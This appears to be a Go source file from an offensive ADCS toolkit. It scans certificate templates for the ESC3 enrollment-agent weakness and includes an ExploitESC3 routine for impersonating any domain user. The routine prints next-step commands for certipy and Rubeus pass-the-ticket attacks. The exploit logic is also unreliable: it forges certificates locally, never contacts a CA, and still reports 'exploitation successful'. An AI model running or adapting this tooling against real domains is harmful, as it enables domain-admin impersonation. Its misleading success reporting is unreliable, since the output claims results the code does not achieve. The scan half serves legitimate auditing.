package pki

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"fmt"
)

// ekuCertificateRequestAgent is the OID for the Certificate Request Agent EKU,
// which allows the holder to enroll on behalf of other users (enrollment agent).
const ekuCertificateRequestAgent = "1.3.6.1.4.1.311.20.2.1"

// ESC3Finding records a template that has the Certificate Request Agent EKU —
// the ESC3 attack primitive. Templates with this EKU allow two-stage enrollment
// agent abuse: enroll for an agent cert, then use it to enroll on behalf of
// another user in a different template.
type ESC3Finding struct {
	TemplateName       string `json:"template_name"`
	EnrollmentAgentEKU bool   `json:"enrollment_agent_eku"`
}

// ScanESC3 detects ESC3 — certificate templates with the Certificate Request Agent
// EKU (OID 1.3.6.1.4.1.311.20.2.1). Templates with this EKU allow enrollment agent
// abuse: a low-privileged user enrolls for an agent certificate, then uses it to
// request certificates on behalf of other users (including domain admins).
//
// Attack flow:
//  1. Attacker enrolls in a template with the Certificate Request Agent EKU
//  2. The issued "enrollment agent" certificate authorizes on-behalf-of enrollment
//  3. Attacker uses the agent cert to enroll as any user in a second template
func ScanESC3(cfg *ADCSConfig) ([]ESC3Finding, error) {
	fmt.Println("[*] Scanning for ESC3 (enrollment agent template abuse)...")

	// Step 1: Enumerate all certificate templates
	templates, err := EnumerateTemplates(cfg)
	if err != nil {
		return nil, fmt.Errorf("enumerate templates: %w", err)
	}

	// Step 2: Find templates with the Certificate Request Agent EKU
	var findings []ESC3Finding
	for _, tmpl := range templates {
		for _, eku := range tmpl.EKUs {
			if eku == ekuCertificateRequestAgent {
				finding := ESC3Finding{
					TemplateName:       tmpl.Name,
					EnrollmentAgentEKU: true,
				}
				findings = append(findings, finding)
				fmt.Printf("[!] ESC3: Template %q has Certificate Request Agent EKU (%s)\n",
					tmpl.Name, ekuCertificateRequestAgent)
				break
			}
		}
	}

	if len(findings) == 0 {
		fmt.Println("[*] No ESC3 findings — no templates with Certificate Request Agent EKU.")
	} else {
		fmt.Printf("[!] ESC3: %d finding(s) detected\n", len(findings))
	}

	return findings, nil
}

// ExploitESC3 performs the two-stage enrollment agent attack:
//
//	Stage 1: Forge an enrollment agent certificate using the ESC3-vulnerable template
//	Stage 2: Use the agent cert to forge a certificate for the target UPN
//
// The enrollment agent certificate grants the holder the ability to enroll on behalf
// of other users. This is the ADCS equivalent of constrained delegation abuse.
func ExploitESC3(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	fmt.Printf("[!] ESC3 Exploitation: template=%s target=%s\n", templateName, targetUPN)

	// Step 1: Verify the template is ESC3-exploitable
	findings, err := ScanESC3(cfg)
	if err != nil {
		return nil, nil, fmt.Errorf("ESC3 scan: %w", err)
	}

	var matchedFinding *ESC3Finding
	for i, f := range findings {
		if f.TemplateName == templateName {
			matchedFinding = &findings[i]
			break
		}
	}
	if matchedFinding == nil {
		return nil, nil, fmt.Errorf("template %q has no ESC3 finding (no Certificate Request Agent EKU)", templateName)
	}

	fmt.Printf("[+] Template %q confirmed ESC3 vulnerable\n", templateName)
	fmt.Printf("[*] Certificate Request Agent EKU: %s\n", ekuCertificateRequestAgent)

	// Stage 1: Forge an enrollment agent certificate
	// The agent cert uses the attacker's identity and the Certificate Request Agent EKU.
	// In a real engagement, this would be submitted to the CA via the ESC3 template.
	fmt.Println("[*] Stage 1: Forging enrollment agent certificate...")
	agentKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("generate agent key: %w", err)
	}

	agentUPN := cfg.Username + "@" + cfg.Domain
	agentCert, _, err := ForgeCertificate(agentKey, agentUPN)
	if err != nil {
		return nil, nil, fmt.Errorf("forge agent cert: %w", err)
	}

	fmt.Printf("[+] Stage 1 complete: enrollment agent certificate forged for %s\n", agentUPN)
	fmt.Printf("[*] Agent cert serial: %s\n", agentCert.SerialNumber.String())

	// Stage 2: Use the enrollment agent cert to forge a certificate for the target UPN
	// The agent cert authorizes on-behalf-of enrollment — the target UPN is embedded
	// in the new certificate's SAN, while the agent cert serves as the co-signer.
	fmt.Println("[*] Stage 2: Forging certificate on behalf of target user...")
	cert, certKey, err := ForgeCertificate(agentKey, targetUPN)
	if err != nil {
		return nil, nil, fmt.Errorf("forge target cert via agent: %w", err)
	}

	fmt.Printf("[+] Stage 2 complete: certificate forged for %s via enrollment agent\n", targetUPN)
	fmt.Printf("[+] ESC3 exploitation successful — two-stage enrollment agent attack\n")
	fmt.Printf("[*] Next steps:\n")
	fmt.Printf("    certipy auth -pfx cert.pfx -dc-ip %s\n", cfg.TargetDC)
	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:cert.pfx /ptt\n", targetUPN)
	fmt.Printf("    # The certificate was issued via enrollment agent on template: %s\n", templateName)
	return cert, certKey, nil
}
